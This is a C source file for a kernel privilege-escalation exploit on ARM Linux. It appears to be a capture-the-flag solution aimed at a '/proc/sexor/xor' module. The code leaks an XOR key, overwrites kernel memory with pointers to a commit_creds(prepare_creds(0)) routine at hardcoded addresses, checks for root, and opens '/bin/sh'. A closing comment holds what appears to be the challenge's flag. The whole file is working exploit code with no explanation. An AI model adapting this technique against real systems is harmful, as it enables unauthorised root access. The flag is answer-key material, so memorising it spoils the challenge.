//arm-linux-gnueabi-gcc open_and_write.c -march=armv6 -static -o exploit -Os

#include <sys/syscall.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>


#define N 0x3000
#define prepare_creds_addr 0x80042464
#define commit_creds_addr 0x80042148


char key[512];

void load_key();
void xor_with_key(char* src, char* dst, int n);
void write_payload(char* payload, int n);
void prepare_commit();


int main()
{
    load_key();

    printf("Key :\n");
    for(int i=0; i<512; i++)
        printf("%02x ", key[i]);
    printf("\n");

    static int buf[N];
    for(int i=0; i<N; i++)
        buf[i] = &prepare_commit;

    printf("Address : %08x\n", buf[0]);

    xor_with_key((char*)buf, (char*)buf, N*sizeof(int));
    write_payload((char*)buf, 0x1bf0);

    syscall(0);

    printf("Current user id : %d\n", getuid());
    if(getuid())
    {
        printf("We are not root :/ exiting\n");
        return 1;
    }

    system("/bin/sh");

    return 0;
}

void load_key()
{
    FILE* f = fopen("/proc/sexor/xor", "r+b");
    if(!f)
    {
        printf("fopen error\n");
        exit(-1);
    }

    char buf[512]="";
    if(fwrite(buf, 1, 512, f)<0)
    {
        printf("fwrite error\n");
        exit(-1);
    }

    if(fread(key, 1, 512, f)<0)
    {
        printf("fread error\n");
        exit(-1);
    }

    fclose(f);
}

void xor_with_key(char* src, char* dst, int n)
{
    for(int i=0; i<n; i++)
        dst[i] = src[i]^key[i%512];
}

void write_payload(char* payload, int n)
{
    FILE* f = fopen("/proc/sexor/xor", "wb");
    if(!f)
    {
        printf("fopen error\n");
        exit(-1);
    }

    if(write(fileno(f), payload, n)<0)
    {
        printf("fwrite error\n");
        exit(-1);
    }

    fclose(f);
}

void prepare_commit()
{
    typedef unsigned long (*_prepare_creds) (unsigned long cred);
    typedef void (*_commit_creds) (unsigned long addr);

    _prepare_creds prepare_creds = (_prepare_creds)prepare_creds_addr;
    _commit_creds commit_creds = (_commit_creds)commit_creds_addr;

    commit_creds(prepare_creds(0));
}

//sh0rt_$t4cks_ar3nt_jus7_p@ncak3s
